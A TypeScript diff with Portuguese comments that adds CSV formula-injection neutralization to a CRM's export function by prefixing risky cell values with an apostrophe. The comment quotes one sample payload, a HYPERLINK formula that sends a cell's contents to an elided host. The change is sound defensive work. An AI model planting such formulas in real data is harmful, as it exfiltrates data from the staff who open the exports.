@@ -11,6 +11,24 @@ export type ColunaCsv<T> = {
   valor: (linha: T) => string | number | null | undefined;
 };
 
+/**
+ * Neutraliza injeção de fórmula (CSV injection).
+ *
+ * O Excel e o LibreOffice avaliam como FÓRMULA toda célula que comece com `=`,
+ * `+`, `-`, `@`, TAB ou CR — e as aspas do CSV não defendem, porque elas são do
+ * formato e somem no parse. O caminho existe inteiro no CRM Sindcom: o
+ * formulário público de filiação grava `nome` sem login, a Secretaria exporta a
+ * listagem e abre no Excel. Um nome como
+ * `=HYPERLINK("http://…/?d="&A1,"clique")` executa na máquina dela.
+ *
+ * A defesa canônica é o apóstrofo inicial: o Excel o consome ao abrir e trata o
+ * resto como texto. O dado continua legível para quem lê a planilha — inclusive
+ * valor negativo, que é o caso legítimo mais comum aqui (o CRM exporta dinheiro).
+ */
+function neutralizarFormula(valor: string): string {
+  return /^[=+\-@\t\r]/.test(valor) ? `'${valor}` : valor;
+}
+
 /** Monta o texto CSV a partir das linhas e da definição de colunas. */
 export function gerarCsv<T>(linhas: T[], colunas: ColunaCsv<T>[]): string {
   const titulos = colunas.map((c) => c.titulo);
@@ -18,7 +36,7 @@ export function gerarCsv<T>(linhas: T[], colunas: ColunaCsv<T>[]): string {
     const registro: Record<string, string> = {};
     for (const c of colunas) {
       const v = c.valor(linha);
-      registro[c.titulo] = v === null || v === undefined ? "" : String(v);
+      registro[c.titulo] = v === null || v === undefined ? "" : neutralizarFormula(String(v));
     }
     return registro;
   });
